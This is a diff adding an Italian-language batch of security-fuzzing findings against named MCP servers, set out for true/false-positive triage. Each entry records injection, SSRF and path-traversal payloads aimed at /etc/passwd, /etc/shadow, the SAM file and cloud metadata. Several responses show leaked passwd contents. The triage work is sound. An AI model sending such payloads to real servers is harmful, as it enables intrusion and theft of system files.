@@ -1,0 +1,968 @@
+{
+ "batch": 40,
+ "n_cluster": 60,
+ "n_finding": 60,
+ "istruzioni": "Per ogni cluster assegnare verdetto VP (vero positivo, vulnerabilita' reale e raggiungibile) o FP (falso positivo), con motivazione breve.",
+ "cluster": [
+  {
+   "id": "68044c3e8262",
+   "tool": "guard",
+   "categoria": "path-traversal-fuzzing",
+   "severita": "high",
+   "linguaggio": "nodejs",
+   "esempio_server": "gh:stat-guy/terminal",
+   "evidenza": {
+    "tipo": "fuzzing",
+    "issue": "Path traversal information disclosure in error message",
+    "payload": "{'jsonrpc': '2.0', 'id': 29, 'method': 'tools/call', 'params': {'name': 'change_directory', 'arguments': {'path': 'test || id'}}}",
+    "response": "{'jsonrpc': '2.0', 'id': 29, 'error': {'code': -32603, 'message': \"MCP error -32603: Failed to change directory: ENOENT: no such file or directory, chdir '/home/tecnico/Desktop/etc/passwd' -> '/home/tecnico/Desktop/etc/passwd/test || id'\"}}"
+   },
+   "n_finding": 1,
+   "n_server": 1
+  },
+  {
+   "id": "f098b3f76ad4",
+   "tool": "guard",
+   "categoria": "path-traversal-fuzzing",
+   "severita": "high",
+   "linguaggio": "nodejs",
+   "esempio_server": "gh:stat-guy/terminal",
+   "evidenza": {
+    "tipo": "fuzzing",
+    "issue": "Path traversal information disclosure in error message",
+    "payload": "{'jsonrpc': '2.0', 'id': 30, 'method': 'tools/call', 'params': {'name': 'change_directory', 'arguments': {'path': \"__import__('os').system('id')\"}}}",
+    "response": "{'jsonrpc': '2.0', 'id': 30, 'error': {'code': -32603, 'message': \"MCP error -32603: Failed to change directory: ENOENT: no such file or directory, chdir '/home/tecnico/Desktop/etc/passwd' -> '/home/tecnico/Desktop/etc/passwd/__import__('os').system('id')'\"}}"
+   },
+   "n_finding": 1,
+   "n_server": 1
+  },
+  {
+   "id": "ee42e22d47e9",
+   "tool": "guard",
+   "categoria": "path-traversal-fuzzing",
+   "severita": "high",
+   "linguaggio": "nodejs",
+   "esempio_server": "gh:stat-guy/terminal",
+   "evidenza": {
+    "tipo": "fuzzing",
+    "issue": "Path traversal information disclosure in error message",
+    "payload": "{'jsonrpc': '2.0', 'id': 31, 'method': 'tools/call', 'params': {'name': 'change_directory', 'arguments': {'path': \"require('child_process').execSync('id').toString()\"}}}",
+    "response": "{'jsonrpc': '2.0', 'id': 31, 'error': {'code': -32603, 'message': \"MCP error -32603: Failed to change directory: ENOENT: no such file or directory, chdir '/home/tecnico/Desktop/etc/passwd' -> '/home/tecnico/Desktop/etc/passwd/require('child_process').execSync('id').toString()'\"}}"
+   },
+   "n_finding": 1,
+   "n_server": 1
+  },
+  {
+   "id": "4a5b06485c43",
+   "tool": "guard",
+   "categoria": "path-traversal-fuzzing",
+   "severita": "high",
+   "linguaggio": "nodejs",
+   "esempio_server": "gh:stat-guy/terminal",
+   "evidenza": {
+    "tipo": "fuzzing",
+    "issue": "Path traversal information disclosure in error message",
+    "payload": "{'jsonrpc': '2.0', 'id': 32, 'method': 'tools/call', 'params': {'name': 'change_directory', 'arguments': {'path': \"eval('1+1')\"}}}",
+    "response": "{'jsonrpc': '2.0', 'id': 32, 'error': {'code': -32603, 'message': \"MCP error -32603: Failed to change directory: ENOENT: no such file or directory, chdir '/home/tecnico/Desktop/etc/passwd' -> '/home/tecnico/Desktop/etc/passwd/eval('1+1')'\"}}"
+   },
+   "n_finding": 1,
+   "n_server": 1
+  },
+  {
+   "id": "81b58be6b276",
+   "tool": "guard",
+   "categoria": "path-traversal-fuzzing",
+   "severita": "high",
+   "linguaggio": "nodejs",
+   "esempio_server": "gh:stat-guy/terminal",
+   "evidenza": {
+    "tipo": "fuzzing",
+    "issue": "Path traversal information disclosure in error message",
+    "payload": "{'jsonrpc': '2.0', 'id': 33, 'method': 'tools/call', 'params': {'name': 'change_directory', 'arguments': {'path': \"' OR 1=1; --\"}}}",
+    "response": "{'jsonrpc': '2.0', 'id': 33, 'error': {'code': -32603, 'message': \"MCP error -32603: Failed to change directory: ENOENT: no such file or directory, chdir '/home/tecnico/Desktop/etc/passwd' -> '/home/tecnico/Desktop/etc/passwd/' OR 1=1; --'\"}}"
+   },
+   "n_finding": 1,
+   "n_server": 1
+  },
+  {
+   "id": "a54d1778f6c7",
+   "tool": "guard",
+   "categoria": "path-traversal-fuzzing",
+   "severita": "high",
+   "linguaggio": "nodejs",
+   "esempio_server": "gh:stat-guy/terminal",
+   "evidenza": {
+    "tipo": "fuzzing",
+    "issue": "Path traversal information disclosure in error message",
+    "payload": "{'jsonrpc': '2.0', 'id': 34, 'method': 'tools/call', 'params': {'name': 'change_directory', 'arguments': {'path': \"'; DROP TABLE users; --\"}}}",
+    "response": "{'jsonrpc': '2.0', 'id': 34, 'error': {'code': -32603, 'message': \"MCP error -32603: Failed to change directory: ENOENT: no such file or directory, chdir '/home/tecnico/Desktop/etc/passwd' -> '/home/tecnico/Desktop/etc/passwd/'; DROP TABLE users; --'\"}}"
+   },
+   "n_finding": 1,
+   "n_server": 1
+  },
+  {
+   "id": "e2036324d24b",
+   "tool": "guard",
+   "categoria": "path-traversal-fuzzing",
+   "severita": "high",
+   "linguaggio": "nodejs",
+   "esempio_server": "gh:stat-guy/terminal",
+   "evidenza": {
+    "tipo": "fuzzing",
+    "issue": "Path traversal information disclosure in error message",
+    "payload": "{'jsonrpc': '2.0', 'id': 36, 'method': 'tools/call', 'params': {'name': 'change_directory', 'arguments': {'path': 'http://169.254.169.254/latest/meta-data/'}}}",
+    "response": "{'jsonrpc': '2.0', 'id': 36, 'error': {'code': -32603, 'message': \"MCP error -32603: Failed to change directory: ENOENT: no such file or directory, chdir '/home/tecnico/Desktop/etc/passwd' -> '/home/tecnico/Desktop/etc/passwd/http:/169.254.169.254/latest/meta-data'\"}}"
+   },
+   "n_finding": 1,
+   "n_server": 1
+  },
+  {
+   "id": "f89bc07964a5",
+   "tool": "guard",
+   "categoria": "path-traversal-fuzzing",
+   "severita": "high",
+   "linguaggio": "nodejs",
+   "esempio_server": "gh:stat-guy/terminal",
+   "evidenza": {
+    "tipo": "fuzzing",
+    "issue": "Path traversal information disclosure in error message",
+    "payload": "{'jsonrpc': '2.0', 'id': 37, 'method': 'tools/call', 'params': {'name': 'change_directory', 'arguments': {'path': 'http://localhost:6379/'}}}",
+    "response": "{'jsonrpc': '2.0', 'id': 37, 'error': {'code': -32603, 'message': \"MCP error -32603: Failed to change directory: ENOENT: no such file or directory, chdir '/home/tecnico/Desktop/etc/passwd' -> '/home/tecnico/Desktop/etc/passwd/http:/localhost:6379'\"}}"
+   },
+   "n_finding": 1,
+   "n_server": 1
+  },
+  {
+   "id": "8f919ab004ce",
+   "tool": "guard",
+   "categoria": "path-traversal-fuzzing",
+   "severita": "critical",
+   "linguaggio": "nodejs",
+   "esempio_server": "gh:pauldw/pwalker-mcp",
+   "evidenza": {
+    "tipo": "fuzzing",
+    "issue": "Path traversal payload returned sensitive file content or path info",
+    "payload": "{'jsonrpc': '2.0', 'id': 22, 'method': 'tools/call', 'params': {'name': 'pop-task', 'arguments': {'input': '....//....//etc/shadow'}}}",
+    "response": "{'result': {'content': [{'type': 'text', 'text': 'daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin'}]}, 'jsonrpc': '2.0', 'id': 22}"
+   },
+   "n_finding": 1,
+   "n_server": 1
+  },
+  {
+   "id": "ac8f0da513ff",
+   "tool": "guard",
+   "categoria": "path-traversal-fuzzing",
+   "severita": "critical",
+   "linguaggio": "nodejs",
+   "esempio_server": "gh:pauldw/pwalker-mcp",
+   "evidenza": {
+    "tipo": "fuzzing",
+    "issue": "Path traversal payload returned sensitive file content or path info",
+    "payload": "{'jsonrpc': '2.0', 'id': 23, 'method': 'tools/call', 'params': {'name': 'pop-task', 'arguments': {'input': '/etc/passwd'}}}",
+    "response": "{'result': {'content': [{'type': 'text', 'text': 'bin:x:2:2:bin:/bin:/usr/sbin/nologin'}]}, 'jsonrpc': '2.0', 'id': 23}"
+   },
+   "n_finding": 1,
+   "n_server": 1
+  },
+  {
+   "id": "c200a08204f0",
+   "tool": "guard",
+   "categoria": "path-traversal-fuzzing",
+   "severita": "critical",
+   "linguaggio": "nodejs",
+   "esempio_server": "gh:pauldw/pwalker-mcp",
+   "evidenza": {
+    "tipo": "fuzzing",
+    "issue": "Path traversal payload returned sensitive file content or path info",
+    "payload": "{'jsonrpc': '2.0', 'id': 38, 'method': 'tools/call', 'params': {'name': 'pop-task', 'arguments': {'input': 'file:///etc/passwd'}}}",
+    "response": "{'result': {'content': [{'type': 'text', 'text': 'nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin'}]}, 'jsonrpc': '2.0', 'id': 38}"
+   },
+   "n_finding": 1,
+   "n_server": 1
+  },
+  {
+   "id": "94d9f49f580e",
+   "tool": "guard",
+   "categoria": "path-traversal-fuzzing",
+   "severita": "high",
+   "linguaggio": "nodejs",
+   "esempio_server": "gh:cyreslab-ai/exploitdb-mcp-server",
+   "evidenza": {
+    "tipo": "fuzzing",
+    "issue": "Path traversal information disclosure in error message",
+    "payload": "{'jsonrpc': '2.0', 'id': 114, 'method': 'prompts/list', 'params': {}}",
+    "response": "{'jsonrpc': '2.0', 'id': 113, 'error': {'code': -32600, 'message': 'MCP error -32600: Invalid URI: file:///etc/shadow'}}"
+   },
+   "n_finding": 1,
+   "n_server": 1
+  },
+  {
+   "id": "a4f3a342b989",
+   "tool": "guard",
+   "categoria": "path-traversal-fuzzing",
+   "severita": "critical",
+   "linguaggio": "nodejs",
+   "esempio_server": "gh:MediocreTriumph/tmux-mcp",
+   "evidenza": {
+    "tipo": "fuzzing",
+    "issue": "Path traversal payload returned sensitive file content or path info",
+    "payload": "{'jsonrpc': '2.0', 'id': 45, 'method': 'tools/call', 'params': {'name': 'tmux_send_keys', 'arguments': {'keys': 'test', 'session_name': '`cat /etc/passwd`'}}}",
+    "response": "{'result': {'content': [{'type': 'text', 'text': 'Error: Failed to send keys: Command failed: tmux send-keys -t \"`cat /etc/passwd`\" \"test\" Enter\\ncan\\'t find window: x:0:0:root:/root:/bin/bash\\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\\nsync:x:4:65534:sync:/bin:/bin/sync\\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\\nwww-data…"
+   },
+   "n_finding": 1,
+   "n_server": 1
+  },
+  {
+   "id": "8e73da824284",
+   "tool": "guard",
+   "categoria": "path-traversal-fuzzing",
+   "severita": "critical",
+   "linguaggio": "nodejs",
+   "esempio_server": "gh:MediocreTriumph/tmux-mcp",
+   "evidenza": {
+    "tipo": "fuzzing",
+    "issue": "Path traversal payload returned sensitive file content or path info",
+    "payload": "{'jsonrpc': '2.0', 'id': 63, 'method': 'tools/call', 'params': {'name': 'tmux_capture_pane', 'arguments': {'session_name': '`cat /etc/passwd`'}}}",
+    "response": "{'result': {'content': [{'type': 'text', 'text': 'Error: Failed to capture pane: Command failed: tmux capture-pane -t \"`cat /etc/passwd`:0\" -p\\ncan\\'t find window: x:0:0:root:/root:/bin/bash\\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\\nsync:x:4:65534:sync:/bin:/bin/sync\\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\\nwww-data:x…"
+   },
+   "n_finding": 1,
+   "n_server": 1
+  },
+  {
+   "id": "cc7962066443",
+   "tool": "guard",
+   "categoria": "path-traversal-fuzzing",
+   "severita": "critical",
+   "linguaggio": "nodejs",
+   "esempio_server": "gh:MediocreTriumph/tmux-mcp",
+   "evidenza": {
+    "tipo": "fuzzing",
+    "issue": "Path traversal payload returned sensitive file content or path info",
+    "payload": "{'jsonrpc': '2.0', 'id': 81, 'method': 'tools/call', 'params': {'name': 'tmux_kill_session', 'arguments': {'session_name': '`cat /etc/passwd`'}}}",
+    "response": "{'result': {'content': [{'type': 'text', 'text': 'Error: Failed to kill session: Command failed: tmux kill-session -t \"`cat /etc/passwd`\"\\ncan\\'t find window: x:0:0:root:/root:/bin/bash\\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\\nsync:x:4:65534:sync:/bin:/bin/sync\\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\\nwww-data:x:33:3…"
+   },
+   "n_finding": 1,
+   "n_server": 1
+  },
+  {
+   "id": "e0bdd519b908",
+   "tool": "guard",
+   "categoria": "path-traversal-fuzzing",
+   "severita": "critical",
+   "linguaggio": "nodejs",
+   "esempio_server": "gh:MediocreTriumph/tmux-mcp",
+   "evidenza": {
+    "tipo": "fuzzing",
+    "issue": "Path traversal payload returned sensitive file content or path info",
+    "payload": "{'jsonrpc': '2.0', 'id': 99, 'method': 'tools/call', 'params': {'name': 'tmux_split_window', 'arguments': {'session_name': '`cat /etc/passwd`'}}}",
+    "response": "{'result': {'content': [{'type': 'text', 'text': 'Error: Failed to split window: Command failed: tmux split-window -t \"`cat /etc/passwd`\"\\ncan\\'t find window: x:0:0:root:/root:/bin/bash\\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\\nsync:x:4:65534:sync:/bin:/bin/sync\\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\\nwww-data:x:33:3…"
+   },
+   "n_finding": 1,
+   "n_server": 1
+  },
+  {
+   "id": "e1b89660caff",
+   "tool": "guard",
+   "categoria": "path-traversal-fuzzing",
+   "severita": "critical",
+   "linguaggio": "nodejs",
+   "esempio_server": "gh:MediocreTriumph/tmux-mcp",
+   "evidenza": {
+    "tipo": "fuzzing",
+    "issue": "Path traversal payload returned sensitive file content or path info",
+    "payload": "{'jsonrpc': '2.0', 'id': 117, 'method': 'tools/call', 'params': {'name': 'tmux_select_pane', 'arguments': {'pane_index': 'test', 'session_name': '`cat /etc/passwd`'}}}",
+    "response": "{'result': {'content': [{'type': 'text', 'text': 'Error: Failed to select pane: Command failed: tmux select-pane -t \"`cat /etc/passwd`:test\"\\ncan\\'t find window: x:0:0:root:/root:/bin/bash\\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\\nsync:x:4:65534:sync:/bin:/bin/sync\\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\\nwww-data:x:3…"
+   },
+   "n_finding": 1,
+   "n_server": 1
+  },
+  {
+   "id": "6e7aa8cd99d1",
+   "tool": "guard",
+   "categoria": "path-traversal-fuzzing",
+   "severita": "critical",
+   "linguaggio": "nodejs",
+   "esempio_server": "gh:MediocreTriumph/tmux-mcp",
+   "evidenza": {
+    "tipo": "fuzzing",
+    "issue": "Path traversal payload returned sensitive file content or path info",
+    "payload": "{'jsonrpc': '2.0', 'id': 135, 'method': 'tools/call', 'params': {'name': 'tmux_list_panes', 'arguments': {'session_name': '`cat /etc/passwd`'}}}",
+    "response": "{'result': {'content': [{'type': 'text', 'text': 'Error: Failed to list panes: Command failed: tmux list-panes -t \"`cat /etc/passwd`\" -F \\'#{pane_index}|#{pane_width}x#{pane_height}|#{pane_active}|#{pane_current_command}\\'\\ncan\\'t find window: x:0:0:root:/root:/bin/bash\\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\\nsync:x:4:65534:sync:/bin:/bin/sync\\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\\nuucp:x:10:10:uucp:/var/spoo…"
+   },
+   "n_finding": 1,
+   "n_server": 1
+  },
+  {
+   "id": "a7ed5cd4407c",
+   "tool": "guard",
+   "categoria": "path-traversal-fuzzing",
+   "severita": "high",
+   "linguaggio": "nodejs",
+   "esempio_server": "gh:sworddut/mcp-local-file-reader",
+   "evidenza": {
+    "tipo": "fuzzing",
+    "issue": "Path traversal information disclosure in error message",
+    "payload": "{'jsonrpc': '2.0', 'id': 112, 'method': 'resources/read', 'params': {'uri': 'file://../../etc/passwd'}}",
+    "response": "{'jsonrpc': '2.0', 'id': 111, 'error': {'code': -32603, 'message': \"无法读取目录: C:\\\\Users\\\\24067\\\\webProject\\\\mcp-local-file-reader\\\\data - ENOENT: no such file or directory, scandir 'C:\\\\Users\\\\24067\\\\webProject\\\\mcp-local-file-reader\\\\data'\"}}"
+   },
+   "n_finding": 1,
+   "n_server": 1
+  },
+  {
+   "id": "745764620def",
+   "tool": "guard",
+   "categoria": "path-traversal-fuzzing",
+   "severita": "high",
+   "linguaggio": "nodejs",
+   "esempio_server": "gh:sworddut/mcp-local-file-reader",
+   "evidenza": {
+    "tipo": "fuzzing",
+    "issue": "Path traversal information disclosure in error message",
+    "payload": "{'jsonrpc': '2.0', 'id': 114, 'method': 'prompts/list', 'params': {}}",
+    "response": "{'jsonrpc': '2.0', 'id': 113, 'error': {'code': -32603, 'message': '读取文件失败: /home/tecnico/gsafe/w1/work/Pipeline/tool_mcp_guard_w1/mcp-local-file-reader/etc/shadow - 文件不存在: /home/tecnico/gsafe/w1/work/Pipeline/tool_mcp_guard_w1/mcp-local-file-reader/etc/shadow'}}"
+   },
+   "n_finding": 1,
+   "n_server": 1
+  },
+  {
+   "id": "095156347baa",
+   "tool": "guard",
+   "categoria": "path-traversal-fuzzing",
+   "severita": "high",
+   "linguaggio": "nodejs",
+   "esempio_server": "gh:umshere/uiflowchartcreator",
+   "evidenza": {
+    "tipo": "fuzzing",
+    "issue": "Path traversal information disclosure in error message",
+    "payload": "{'jsonrpc': '2.0', 'id': 114, 'method': 'prompts/list', 'params': {}}",
+    "response": "{'jsonrpc': '2.0', 'id': 113, 'error': {'code': -32600, 'message': 'MCP error -32600: Invalid resource URI format: file:///etc/shadow'}}"
+   },
+   "n_finding": 1,
+   "n_server": 1
+  },
+  {
+   "id": "7d618b95006b",
+   "tool": "guard",
+   "categoria": "path-traversal-fuzzing",
+   "severita": "high",
+   "linguaggio": "nodejs",
+   "esempio_server": "gh:reyesbho/mcp-moments",
+   "evidenza": {
+    "tipo": "fuzzing",
+    "issue": "Path traversal information disclosure in error message",
+    "payload": "{'jsonrpc': '2.0', 'id': 114, 'method': 'prompts/list', 'params': {}}",
+    "response": "{'jsonrpc': '2.0', 'id': 113, 'error': {'code': -32603, 'message': 'Esquema no soportado: file:///etc/shadow'}}"
+   },
+   "n_finding": 1,
+   "n_server": 1
+  },
+  {
+   "id": "eda78a99cf17",
+   "tool": "guard",
+   "categoria": "path-traversal-fuzzing",
+   "severita": "high",
+   "linguaggio": "nodejs",
+   "esempio_server": "gh:PWalaGov/File-Control-MCP",
+   "evidenza": {
+    "tipo": "fuzzing",
+    "issue": "Path traversal information disclosure in error message",
+    "payload": "{'jsonrpc': '2.0', 'id': 186, 'method': 'tools/call', 'params': {'name': 'rename_file', 'arguments': {'new_path': 'test', 'old_path': 'C:\\\\Windows\\\\System32\\\\config\\\\SAM'}}}",
+    "response": "{'jsonrpc': '2.0', 'id': 186, 'error': {'code': -32603, 'message': \"MCP error -32603: Failed to rename file: ENOENT: no such file or directory, access '/home/tecnico/gsafe/w1/work/etc/passwd/C:\\\\Windows\\\\System32\\\\config\\\\SAM'\"}}"
+   },
+   "n_finding": 1,
+   "n_server": 1
+  },
+  {
+   "id": "22c5c8b83851",
+   "tool": "guard",
+   "categoria": "path-traversal-fuzzing",
+   "severita": "high",
+   "linguaggio": "nodejs",
+   "esempio_server": "gh:PWalaGov/File-Control-MCP",
+   "evidenza": {
+    "tipo": "fuzzing",
+    "issue": "Path traversal information disclosure in error message",
+    "payload": "{'jsonrpc': '2.0', 'id': 188, 'method': 'tools/call', 'params': {'name': 'rename_file', 'arguments': {'new_path': 'test', 'old_path': '$(id)'}}}",
+    "response": "{'jsonrpc': '2.0', 'id': 188, 'error': {'code': -32603, 'message': \"MCP error -32603: Failed to rename file: ENOENT: no such file or directory, access '/home/tecnico/gsafe/w1/work/etc/passwd/$(id)'\"}}"
+   },
+   "n_finding": 1,
+   "n_server": 1
+  },
+  {
+   "id": "bbd10f977407",
+   "tool": "guard",
+   "categoria": "path-traversal-fuzzing",
+   "severita": "high",
+   "linguaggio": "nodejs",
+   "esempio_server": "gh:PWalaGov/File-Control-MCP",
+   "evidenza": {
+    "tipo": "fuzzing",
+    "issue": "Path traversal information disclosure in error message",
+    "payload": "{'jsonrpc': '2.0', 'id': 190, 'method': 'tools/call', 'params': {'name': 'rename_file', 'arguments': {'new_path': 'test', 'old_path': 'test && ls -la /'}}}",
+    "response": "{'jsonrpc': '2.0', 'id': 190, 'error': {'code': -32603, 'message': \"MCP error -32603: Failed to rename file: ENOENT: no such file or directory, access '/home/tecnico/gsafe/w1/work/etc/passwd/test && ls -la '\"}}"
+   },
+   "n_finding": 1,
+   "n_server": 1
+  },
+  {
+   "id": "66b70255582d",
+   "tool": "guard",
+   "categoria": "path-traversal-fuzzing",
+   "severita": "high",
+   "linguaggio": "nodejs",
+   "esempio_server": "gh:PWalaGov/File-Control-MCP",
+   "evidenza": {
+    "tipo": "fuzzing",
+    "issue": "Path traversal information disclosure in error message",
+    "payload": "{'jsonrpc': '2.0', 'id': 191, 'method': 'tools/call', 'params': {'name': 'rename_file', 'arguments': {'new_path': 'test', 'old_path': 'test || id'}}}",
+    "response": "{'jsonrpc': '2.0', 'id': 191, 'error': {'code': -32603, 'message': \"MCP error -32603: Failed to rename file: ENOENT: no such file or directory, access '/home/tecnico/gsafe/w1/work/etc/passwd/test || id'\"}}"
+   },
+   "n_finding": 1,
+   "n_server": 1
+  },
+  {
+   "id": "bb4f6470e821",
+   "tool": "guard",
+   "categoria": "path-traversal-fuzzing",
+   "severita": "high",
+   "linguaggio": "nodejs",
+   "esempio_server": "gh:PWalaGov/File-Control-MCP",
+   "evidenza": {
+    "tipo": "fuzzing",
+    "issue": "Path traversal information disclosure in error message",
+    "payload": "{'jsonrpc': '2.0', 'id': 192, 'method': 'tools/call', 'params': {'name': 'rename_file', 'arguments': {'new_path': 'test', 'old_path': \"__import__('os').system('id')\"}}}",
+    "response": "{'jsonrpc': '2.0', 'id': 192, 'error': {'code': -32603, 'message': \"MCP error -32603: Failed to rename file: ENOENT: no such file or directory, access '/home/tecnico/gsafe/w1/work/etc/passwd/__import__('os').system('id')'\"}}"
+   },
+   "n_finding": 1,
+   "n_server": 1
+  },
+  {
+   "id": "1c1eb6157567",
+   "tool": "guard",
+   "categoria": "path-traversal-fuzzing",
+   "severita": "high",
+   "linguaggio": "nodejs",
+   "esempio_server": "gh:PWalaGov/File-Control-MCP",
+   "evidenza": {
+    "tipo": "fuzzing",
+    "issue": "Path traversal information disclosure in error message",
+    "payload": "{'jsonrpc': '2.0', 'id': 193, 'method': 'tools/call', 'params': {'name': 'rename_file', 'arguments': {'new_path': 'test', 'old_path': \"require('child_process').execSync('id').toString()\"}}}",
+    "response": "{'jsonrpc': '2.0', 'id': 193, 'error': {'code': -32603, 'message': \"MCP error -32603: Failed to rename file: ENOENT: no such file or directory, access '/home/tecnico/gsafe/w1/work/etc/passwd/require('child_process').execSync('id').toString()'\"}}"
+   },
+   "n_finding": 1,
+   "n_server": 1
+  },
+  {
+   "id": "fb759d4f4306",
+   "tool": "guard",
+   "categoria": "path-traversal-fuzzing",
+   "severita": "high",
+   "linguaggio": "nodejs",
+   "esempio_server": "gh:PWalaGov/File-Control-MCP",
+   "evidenza": {
+    "tipo": "fuzzing",
+    "issue": "Path traversal information disclosure in error message",
+    "payload": "{'jsonrpc': '2.0', 'id': 194, 'method': 'tools/call', 'params': {'name': 'rename_file', 'arguments': {'new_path': 'test', 'old_path': \"eval('1+1')\"}}}",
+    "response": "{'jsonrpc': '2.0', 'id': 194, 'error': {'code': -32603, 'message': \"MCP error -32603: Failed to rename file: ENOENT: no such file or directory, access '/home/tecnico/gsafe/w1/work/etc/passwd/eval('1+1')'\"}}"
+   },
+   "n_finding": 1,
+   "n_server": 1
+  },
+  {
+   "id": "5c1b5b6387bb",
+   "tool": "guard",
+   "categoria": "path-traversal-fuzzing",
+   "severita": "high",
+   "linguaggio": "nodejs",
+   "esempio_server": "gh:PWalaGov/File-Control-MCP",
+   "evidenza": {
+    "tipo": "fuzzing",
+    "issue": "Path traversal information disclosure in error message",
+    "payload": "{'jsonrpc': '2.0', 'id': 195, 'method': 'tools/call', 'params': {'name': 'rename_file', 'arguments': {'new_path': 'test', 'old_path': \"' OR 1=1; --\"}}}",
+    "response": "{'jsonrpc': '2.0', 'id': 195, 'error': {'code': -32603, 'message': \"MCP error -32603: Failed to rename file: ENOENT: no such file or directory, access '/home/tecnico/gsafe/w1/work/etc/passwd/' OR 1=1; --'\"}}"
+   },
+   "n_finding": 1,
+   "n_server": 1
+  },
+  {
+   "id": "59888b87198c",
+   "tool": "guard",
+   "categoria": "path-traversal-fuzzing",
+   "severita": "high",
+   "linguaggio": "nodejs",
+   "esempio_server": "gh:PWalaGov/File-Control-MCP",
+   "evidenza": {
+    "tipo": "fuzzing",
+    "issue": "Path traversal information disclosure in error message",
+    "payload": "{'jsonrpc': '2.0', 'id': 196, 'method': 'tools/call', 'params': {'name': 'rename_file', 'arguments': {'new_path': 'test', 'old_path': \"'; DROP TABLE users; --\"}}}",
+    "response": "{'jsonrpc': '2.0', 'id': 196, 'error': {'code': -32603, 'message': \"MCP error -32603: Failed to rename file: ENOENT: no such file or directory, access '/home/tecnico/gsafe/w1/work/etc/passwd/'; DROP TABLE users; --'\"}}"
+   },
+   "n_finding": 1,
+   "n_server": 1
+  },
+  {
+   "id": "7110e448fc4a",
+   "tool": "guard",
+   "categoria": "path-traversal-fuzzing",
+   "severita": "high",
+   "linguaggio": "nodejs",
+   "esempio_server": "gh:PWalaGov/File-Control-MCP",
+   "evidenza": {
+    "tipo": "fuzzing",
+    "issue": "Path traversal information disclosure in error message",
+    "payload": "{'jsonrpc': '2.0', 'id': 198, 'method': 'tools/call', 'params': {'name': 'rename_file', 'arguments': {'new_path': 'test', 'old_path': 'http://169.254.169.254/latest/meta-data/'}}}",
+    "response": "{'jsonrpc': '2.0', 'id': 198, 'error': {'code': -32603, 'message': \"MCP error -32603: Failed to rename file: ENOENT: no such file or directory, access '/home/tecnico/gsafe/w1/work/etc/passwd/http:/169.254.169.254/latest/meta-data'\"}}"
+   },
+   "n_finding": 1,
+   "n_server": 1
+  },
+  {
+   "id": "bf7d0cb08a44",
+   "tool": "guard",
+   "categoria": "path-traversal-fuzzing",
+   "severita": "high",
+   "linguaggio": "nodejs",
+   "esempio_server": "gh:PWalaGov/File-Control-MCP",
+   "evidenza": {
+    "tipo": "fuzzing",
+    "issue": "Path traversal information disclosure in error message",
+    "payload": "{'jsonrpc': '2.0', 'id': 199, 'method': 'tools/call', 'params': {'name': 'rename_file', 'arguments': {'new_path': 'test', 'old_path': 'http://localhost:6379/'}}}",
